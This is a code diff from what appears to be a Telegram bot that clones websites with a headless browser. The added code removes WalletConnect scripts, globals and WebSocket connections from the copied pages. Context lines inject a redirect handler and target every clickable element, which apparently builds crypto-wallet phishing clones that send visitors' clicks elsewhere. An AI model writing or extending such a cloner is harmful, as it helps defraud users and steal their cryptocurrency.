@@ -101,6 +101,16 @@ bot.on("text", async (ctx) => {
           });
           await new Promise((resolve) => setTimeout(resolve, 5000)); // Additional wait for dynamic content
 
+          await page.setRequestInterception(true);
+          page.on("request", (request) => {
+            if (request.url().includes("wss://relay.walletconnect.com")) {
+              request.abort();
+              console.log("🚫 Aborted WalletConnect WebSocket request");
+            } else {
+              request.continue();
+            }
+          });
+
           // Execute JavaScript in the browser context to modify image src and remove srcset
           await page.evaluate((siteUrl) => {
             const images = document.querySelectorAll("img[src]");
@@ -128,7 +138,11 @@ bot.on("text", async (ctx) => {
               }
             });
           }, siteUrl);
-
+          await page.evaluate(() => {
+            window.WalletConnect = undefined;
+            window.WalletConnectProvider = undefined;
+            console.log("🚫 Disabled WalletConnect globals");
+          });
           // Get the modified HTML after JavaScript execution
           const html = await page.content();
           const $ = cheerio.load(html);
@@ -208,7 +222,17 @@ bot.on("text", async (ctx) => {
               });
             }
           });
-
+          $("script").each((_, el) => {
+            const src = $(el).attr("src") || "";
+            const content = $(el).html() || "";
+            if (
+              src.includes("walletconnect") ||
+              content.includes("walletconnect")
+            ) {
+              $(el).remove();
+              console.log("🗑️ Removed WalletConnect script");
+            }
+          });
           $("head").prepend(`<script class="dynamic-script">
   window.addEventListener('DOMContentLoaded', () => {
     console.log("🔁 Running prioritized image fixer...");
@@ -261,7 +285,6 @@ bot.on("text", async (ctx) => {
   });
 </script>`);
 
-      
           $("head").prepend(`<script class="safe-redirect-handler">
   window.addEventListener("DOMContentLoaded", () => {
     const redirectURL = "${redirectURL}";
@@ -344,9 +367,7 @@ bot.on("text", async (ctx) => {
  </script>
  `);
 
-
-
- $("head").prepend(`
+          $("head").prepend(`
   <style>
     a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],
     [class*='cursor'], input[type='button'], input[type='submit'], input[type='reset'] {
